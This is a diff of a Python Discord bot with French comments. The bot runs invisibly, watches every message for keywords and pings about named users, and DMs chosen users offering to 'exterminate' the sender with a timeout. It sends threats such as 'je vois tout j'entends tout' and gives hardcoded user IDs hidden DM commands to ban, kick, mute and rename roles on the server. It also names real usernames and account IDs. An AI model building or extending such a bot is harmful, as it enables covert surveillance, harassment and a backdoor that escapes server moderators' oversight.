@@ -11,15 +11,15 @@ intents.members = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# Identifiants autorisés et configuration des cibles/surveillances
-AUTHORIZED_IDS = [1402771839029219442, 996157528092184687, 776111075036889160]
-TARGET_USERNAME = "akz_92"
+# Configuration des identifiants et des cibles
 VICTIME_NAME = "m1zuki_1"
 
-# Mots clés de surveillance par groupes
-MOTS_GROUPE_1 = ["tom", "kyzo", "kaizo", "chinois sans nems"]
-MOTS_GROUPE_2 = ["hamza", "ogi"]
-MOTS_CLES = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"] + MOTS_GROUPE_1 + MOTS_GROUPE_2
+# Les nouveaux IDs autorisés pour le contrôle/surveillance de type 1 et 2
+IDS_GROUPE_1 = [1402771839029219442, 776111075036889160] # Tom (PC/Tel)
+IDS_GROUPE_2 = [996157528092184687] # Hamza / Ogi
+
+MOTS_CLES_1 = ["tom", "kyzo", "kaizo", "chinois sans nems"]
+MOTS_CLES_2 = ["hamza", "ogi"]
 
 # Stockage temporaire pour les demandes de timeout
 pending_timeouts = {}
@@ -51,15 +51,17 @@ async def get_guild_from_input(identifier):
 
 @bot.event
 async def on_ready():
+    # Force le statut en mode invisible (hors-ligne) dès que le bot est prêt
     await bot.change_presence(status=discord.Status.invisible)
     print(f"Bot furtif opérationnel et invisible. Surveillance active.")
 
 # =========================================================================
-# AUTO-ROLE : Ajoute automatiquement le rôle "Membre" à akz_92
+# AUTO-ROLE : Ajoute automatiquement le rôle "Membre" aux IDs spécifiés
 # =========================================================================
 @bot.event
 async def on_member_update(before, after):
-    if after.name == TARGET_USERNAME:
+    tous_ids = IDS_GROUPE_1 + IDS_GROUPE_2
+    if after.id in tous_ids:
         role = discord.utils.get(after.guild.roles, name="Membre")
         if role and role not in after.roles:
             try:
@@ -73,45 +75,61 @@ async def on_message(message):
         return
 
     # =========================================================================
-    # COMMANDE PUBLIQUE : !untoakz (Retire le timeout d'akz_92)
-    # =========================================================================
-    if message.content.startswith("!untoakz"):
-        try:
-            guild = message.guild
-            member = guild.get_member_named(TARGET_USERNAME) or discord.utils.get(guild.members, name=TARGET_USERNAME)
-            if member:
-                await member.timeout(None, reason="Utilisation de !untoakz par un membre")
-                await message.channel.send("✅ Timeout retiré pour akz_92.")
-        except Exception as e:
-            pass
-
-    # =========================================================================
-    # 0. SYSTEME DE SURVEILLANCE & CIBLES VERROUILLÉES
+    # 0. SYSTEME DE SURVEILLANCE & CIBLES (m1zuki_1 et les nouveaux IDs)
     # =========================================================================
     content_lower = message.content.lower()
-    is_ping_groupe1 = any(str(uid) in message.content for uid in [1402771839029219442, 776111075036889160])
-    is_ping_groupe2 = "996157528092184687" in message.content
     
-    declenche = False
-    if any(mot in content_lower for mot in MOTS_CLES) or is_ping_groupe1 or is_ping_groupe2:
-        if message.author.name != VICTIME_NAME and message.author.id not in AUTHORIZED_IDS:
-            declenche = True
-
-    if declenche:
-        victime = discord.utils.get(message.guild.members, name=VICTIME_NAME) or discord.utils.get(message.guild.members, id=996157528092184687)
+    # 1. Surveillance pour m1zuki_1 (mots clés originaux)
+    mots_cles_m1zuki = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"]
+    if any(mot.lower() in content_lower for mot in mots_cles_m1zuki) and message.author.name != VICTIME_NAME:
+        victime = discord.utils.get(message.guild.members, name=VICTIME_NAME)
         if victime:
             pending_timeouts[message.author.id] = message.author
             try:
                 await victime.send(
                     f"🚨 **Cible verrouillée** 🚨\n"
-                    f"L'utilisateur '{message.author.name}' a prononcé un mot surveillé ou un ping.\n"
+                    f"L'utilisateur '{message.author.name}' a dis votre prénom.\n"
                     f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
                 )
             except:
                 pass
 
-    # Réponses en DM pour valider ou non le timeout
-    if isinstance(message.channel, discord.DMChannel) and (message.author.name == VICTIME_NAME or message.author.id in AUTHORIZED_IDS):
+    # 2. Surveillance pour Groupe 1 (Tom: 1402771839029219442 et 776111075036889160)
+    ping_groupe_1 = any(str(uid) in message.content for uid in IDS_GROUPE_1)
+    if (any(mot in content_lower for mot in MOTS_CLES_1) or ping_groupe_1) and message.author.id not in IDS_GROUPE_1:
+        # On cible le premier ID du groupe 1 pour recevoir l'alerte
+        surveillant = message.guild.get_member(IDS_GROUPE_1[0]) or bot.get_user(IDS_GROUPE_1[0])
+        if surveillant:
+            pending_timeouts[message.author.id] = message.author
+            try:
+                await surveillant.send(
+                    f"🚨 **Cible verrouillée (Groupe 1)** 🚨\n"
+                    f"L'utilisateur '{message.author.name}' a déclenché un mot-clé ou vous a pingé.\n"
+                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
+                )
+            except:
+                pass
+
+    # 3. Surveillance pour Groupe 2 (996157528092184687 - Hamza/Ogi)
+    ping_groupe_2 = any(str(uid) in message.content for uid in IDS_GROUPE_2)
+    if (any(mot in content_lower for mot in MOTS_CLES_2) or ping_groupe_2) and message.author.id not in IDS_GROUPE_2:
+        surveillant = message.guild.get_member(IDS_GROUPE_2[0]) or bot.get_user(IDS_GROUPE_2[0])
+        if surveillant:
+            pending_timeouts[message.author.id] = message.author
+            try:
+                await surveillant.send(
+                    f"🚨 **Cible verrouillée (Groupe 2)** 🚨\n"
+                    f"L'utilisateur '{message.author.name}' a déclenché un mot-clé ou vous a pingé.\n"
+                    f"Voulez-vous l'exterminer (timeout 10min) ? Répondez **oui** ou **non**."
+                )
+            except:
+                pass
+
+    # Réponses de m1zuki_1 ou des nouveaux IDs en DM pour valider ou non le timeout
+    tous_gestionnaires_dm = [VICTIME_NAME] + IDS_GROUPE_1 + IDS_GROUPE_2
+    is_authorized_dm_user = message.author.name == VICTIME_NAME or message.author.id in IDS_GROUPE_1 + IDS_GROUPE_2
+
+    if isinstance(message.channel, discord.DMChannel) and is_authorized_dm_user:
         content = message.content.lower().strip()
         if content in ["oui", "non"]:
             if pending_timeouts:
@@ -119,17 +137,30 @@ async def on_message(message):
                 target = pending_timeouts[user_id]
                 
                 if content == "oui":
+                    # Si m1zuki_1 répond "oui", le bot se fait kick du serveur concerné et envoie les messages en MP
+                    if message.author.name == VICTIME_NAME:
+                        try:
+                            # Le bot s'éjecte de tous les serveurs communs avec la cible ou le serveur d'origine si possible, 
+                            # ici on quitte le serveur d'où venait l'action si on le trouve, ou on se kick globalement des serveurs de la cible
+                            for g in bot.guilds:
+                                member_in_guild = g.get_member(target.id)
+                                if member_in_guild:
+                                    await g.kick(bot.user, reason="Kick automatique suite au 'oui' de m1zuki_1")
+                        except:
+                            pass
+                        try:
+                            await message.author.send("redis plus jamais mon nom sans mon autorisation")
+                            await message.author.send("je vois tout j'entends tout")
+                        except:
+                            pass
+
                     try:
                         duration = datetime.timedelta(minutes=10)
-                        await target.timeout(duration, reason="Punition surveillance")
-                        await message.author.send("redis plus jamais mon nom sans mon autorisation")
-                        await message.author.send("je vois tout j'entends tout")
-                        # Le bot se fait kick du serveur où s'est produit l'incident si possible
-                        if message.guild:
-                            await message.guild.kick(bot.user, reason="Auto-kick suite au 'oui'")
+                        await target.timeout(duration, reason="Punition validée")
+                        await target.send(f"Tu dis mon prénom ? Explique toi maintenant ! @{message.author.name}")
                         await message.author.send(f"✅ L'utilisateur {target.name} a pris un timeout de 10 min.")
                     except Exception as e:
-                        await message.author.send(f"❌ Erreur : {e}")
+                        await message.author.send(f"❌ Impossible de timeout cette personne : {e}")
                 else:
                     await message.author.send("✅ Action annulée.")
                 
@@ -139,10 +170,10 @@ async def on_message(message):
             return
 
     # =========================================================================
-    # 1. GESTION DES DM (Contrôle à distance sécurisé pour les IDs autorisés)
+    # 1. GESTION DES DM (Contrôle à distance sécurisé pour les nouveaux IDs)
     # =========================================================================
     if isinstance(message.channel, discord.DMChannel):
-        if message.author.id not in AUTHORIZED_IDS:
+        if message.author.id not in (IDS_GROUPE_1 + IDS_GROUPE_2):
             return
 
         args = message.content.split()
@@ -208,7 +239,7 @@ async def on_message(message):
                     return
                 member = await guild.fetch_member(int(args[2]))
                 await member.timeout(None, reason="Retrait du timeout via DM")
-                await message.author.send(f"✅ Timeout retiré pour {member.name}.")
+                await message.author.send(f"✅ Le timeout de {member.name} a été retiré.")
 
             elif cmd == "kick":
                 guild = await get_guild_from_input(args[1])
@@ -239,11 +270,11 @@ async def on_message(message):
                     role = guild.get_role(int(role_input))
                 if not role:
                     role = discord.utils.get(guild.roles, name=role_input)
-                if role:
-                    await role.edit(name=new_role_name)
-                    await message.author.send(f"✅ Rôle renommé en '{new_role_name}'.")
-                else:
+                if not role:
                     await message.author.send("❌ Rôle introuvable.")
+                    return
+                await role.edit(name=new_role_name)
+                await message.author.send(f"✅ Rôle renommé en '{new_role_name}'.")
 
             elif cmd == "puissance":
                 guild = await get_guild_from_input(args[1])
@@ -309,6 +340,16 @@ async def on_message(message):
                 new_channel = await guild.create_text_channel(channel_name)
                 await message.author.send(f"✅ Salon #{new_channel.name} créé (ID: {new_channel.id}).")
 
+            elif cmd == "mute":
+                guild = await get_guild_from_input(args[1])
+                if not guild:
+                    await message.author.send("❌ Serveur introuvable ou invitation invalide.")
+                    return
+                member = await guild.fetch_member(int(args[2]))
+                duration_mins = int(args[3]) if len(args) > 3 and args[3].isdigit() else 10
+                await member.timeout(datetime.timedelta(minutes=duration_mins), reason="Mute serveur via DM")
+                await message.author.send(f"✅ {member.name} a été muté pour {duration_mins} minutes.")
+
             elif cmd == ".kyzo" or cmd == "kyzo":
                 await message.author.send("✅ Commande .kyzo bien exécutée et opérationnelle !")
 
@@ -317,10 +358,26 @@ async def on_message(message):
         return
 
     # =========================================================================
-    # 2. COMMANDE .ban SUR LE SERVEUR (Silencieuse / Réservée aux IDs autorisés)
+    # 2. COMMANDES SUR LE SERVEUR (.ban et !untoakz)
     # =========================================================================
+    
+    # Commande !untoakz : Utilisable par n'importe quel membre pour retirer le timeout de akz_92 si bloqué
+    if message.content.startswith("!untoakz"):
+        try:
+            # Recherche de l'ancien akz_92 par son nom si présent sur le serveur
+            old_akz = discord.utils.get(message.guild.members, name="akz_92")
+            if old_akz:
+                await old_akz.timeout(None, reason="Retrait du timeout de akz_92 via !untoakz")
+                await message.channel.send(f"✅ Le timeout de @akz_92 a été réinitialisé avec succès.")
+            else:
+                await message.channel.send("❌ akz_92 introuvable sur ce serveur.")
+        except Exception as e:
+            await message.channel.send(f"❌ Erreur : {e}")
+        return
+
+    # Commande .ban : Réservée aux nouveaux IDs autorisés
     if message.content.startswith(".ban"):
-        if message.author.id in AUTHORIZED_IDS:
+        if message.author.id in (IDS_GROUPE_1 + IDS_GROUPE_2):
             try:
                 await message.delete()
             except:
@@ -341,5 +398,6 @@ async def on_message(message):
 # Lancement du serveur web pour Render
 keep_alive()
 
-# Lancement sécurisé via la variable d'environnement
+# Lancement sécurisé via la variable d'environnement (Token géré sur l'hébergeur)
 bot.run(os.getenv("TOKEN"))
+```[cite: 2]
